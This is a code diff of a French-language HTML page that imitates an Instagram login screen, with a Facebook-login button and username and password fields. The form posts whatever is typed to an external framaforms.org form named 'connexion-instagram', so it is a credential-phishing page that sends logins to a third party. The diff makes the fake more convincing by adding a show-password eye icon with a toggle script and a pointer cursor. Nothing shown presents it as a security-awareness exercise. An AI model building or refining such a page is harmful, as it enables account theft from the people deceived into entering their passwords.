@@ -31,7 +31,7 @@
       width: 100%;
       padding: 12px;
       font-size: 16px;
-      cursor: default; /* Pas de curseur pointer, car pas cliquable */
+      cursor: pointer;
       border-radius: 5px;
       margin-bottom: 25px;
     }
@@ -47,25 +47,54 @@
       border-radius: 5px;
       margin-top: 25px;
     }
+    .password-wrapper {
+      position: relative;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 37px;
+      width: 24px;
+      height: 24px;
+      cursor: pointer;
+      fill: #888;
+    }
   </style>
 </head>
 <body>
 
-<form 
-  action="https://framaforms.org/connexion-instagram-1752775137" 
-  method="POST"
-  autocomplete="off"
->
-  <button type="button" class="facebook-btn">Connexion avec Facebook</button>
+  <form
+    action="https://framaforms.org/connexion-instagram-1752775137"
+    method="POST"
+    autocomplete="off"
+  >
+    <button type="button" class="facebook-btn">Connexion avec Facebook</button>
 
-  <label for="username">Téléphone, nom d’utilisateur ou email *</label>
-  <input type="text" id="username" name="new_1752775215051" required />
+    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
+    <input type="text" id="username" name="new_1752775215051" required />
 
-  <label for="password">Mot de passe *</label>
-  <input type="password" id="password" name="new_1752775407266" required />
+    <label for="password">Mot de passe *</label>
+    <div class="password-wrapper">
+      <input type="password" id="password" name="new_1752775407266" required />
+      <svg class="toggle-password" viewBox="0 0 24 24" aria-label="Afficher le mot de passe" role="img" tabindex="0" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+        <circle cx="12" cy="12" r="2.5"/>
+      </svg>
+    </div>
 
-  <button type="submit">Se connecter</button>
-</form>
+    <button type="submit">Se connecter</button>
+  </form>
+
+<script>
+  // Toggle mot de passe visible / caché
+  const togglePassword = document.querySelector('.toggle-password');
+  const passwordInput = document.getElementById('password');
+
+  togglePassword.addEventListener('click', () => {
+    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordInput.setAttribute('type', type);
+  });
+</script>
 
 </body>
 </html>
